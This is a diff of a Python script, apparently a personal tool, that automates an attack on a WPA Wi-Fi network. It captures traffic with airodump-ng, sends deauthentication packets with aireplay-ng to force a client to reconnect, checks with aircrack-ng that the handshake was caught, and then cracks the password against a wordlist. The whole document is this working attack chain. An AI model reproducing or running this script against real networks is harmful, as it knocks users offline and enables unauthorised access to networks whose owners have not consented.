@@ -1,62 +1,71 @@
 #!venv/bin/python
 
 import os, sys, subprocess, time
-import threading
-from threading import Thread, Event
+#import threading
+import multiprocessing
 
-interface = "wlp1s0"
-# Struhar - 5GHz
+interface = "wlp1s0mon"
+
 ssid = "Test_Wifi"
 bssid = "42:ed:00:17:e0:d8"
 channel = "5"
 
 client_mac = "9a:23:6b:36:1f:1b"
+deauth_type = "client"
 
-output_dir = f"/home/filip/Coding/WiFighter/attacks/handshake_crack/{ssid}"
-output_file= f"{output_dir}/{ssid}"
+output_dir = f"/home/filip/Coding/WiFighter/attacks/{ssid}"
+output_file = f"{output_dir}/handshake"
+#output_file = f"/home/filip/Coding/WiFighter/attacks/{ssid}/handshake"
 
+# Run airodump-ng
+def run_airodump(interface, bssid, channel, output_file):
+    if interface and bssid and channel and output_file:
+        #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface} > /dev/null 2>&1")
+        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', output_file, interface]
+        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# Function to run airodump-ng
-def run_airodump(interface, ssid, bssid, channel, output_dir):
-    #return subprocess.Popen(['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/{ssid}', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    os.popen(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_dir}/{ssid} {interface}")
-    if event.is_set():
-        print('Airodump stopped...')
-        exit
+# Run aireplay-ng
+def run_aireplay(interface, bssid, client_mac, deauth_type):
+    if interface and bssid and client_mac and deauth_type:
+        if deauth_type == "client":
+            if client_mac:
+                #os.popen(f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
+                command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
+                subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif deauth_type == "broadcast":
+            os.popen(f"sudo aireplay-ng -0 1 -a {bssid} {interface}")
 
-# Function to run aireplay-ng
-def run_aireplay(interface, bssid, client_mac):
-    #subprocess.call(['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface])
-    os.popen(f"sudo aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
+# Define processes
+capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_file))
+deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))
 
-airodump_thread = threading.Thread(target = run_airodump, args=(interface, ssid, bssid, channel, output_dir))
-aireplay_thread = threading.Thread(target = run_aireplay, args=(interface, bssid, client_mac))
-
-event = Event()
-
-airodump_thread.start()
+# Listen for handshake
+capture_handshake.start() # Start airodump-ng process
 time.sleep(2)
 
-aireplay_thread.start()
-aireplay_thread.join()
-print(f"[1] Client {client_mac} deauthicated")
+# Deauth client/s
+deauth_client.start() # Start aireplay-ng process
+deauth_client.join() # Wait for the process to stop
+print(f"[1] Deauth packet send to client {client_mac}")
 
+# Wait and verify that handshake was captured successfuly
 captured = False
 print('[2] Waiting for handshake...')
 while not captured:
-    if os.path.exists(f"{output_dir}/{ssid}-01.cap"):
-        verify = os.popen(f"sudo aircrack-ng {output_dir}/{ssid}-01.cap").read()
-        if "(1 handshake)" in verify:
+    if os.path.exists(f"{output_file}-01.cap"):
+        #verify = os.popen(f"sudo aircrack-ng {output_file}-01.cap").read()
+        command = ['sudo', 'aircrack-ng', f'{output_file}-01.cap']
+        verify = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)
+        output = str(verify.communicate())
+        if "(0 handshake)" not in output and "Unknown" not in output:
+            print("[3] Handshake/s captured!")
             captured = True
+    time.sleep(1)
 
-    time.sleep(3)
+capture_handshake.kill() # Stop airodump-ng process
+capture_handshake.join() # Wait for the process to stop
 
-print("[3] Handshake captured!")
-event.set()
-
-os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{ssid}-01.cap")
-
-
+os.system(f"sudo aircrack-ng -w wordlist.txt {output_file}-01.cap") # Crack password
 
 
 
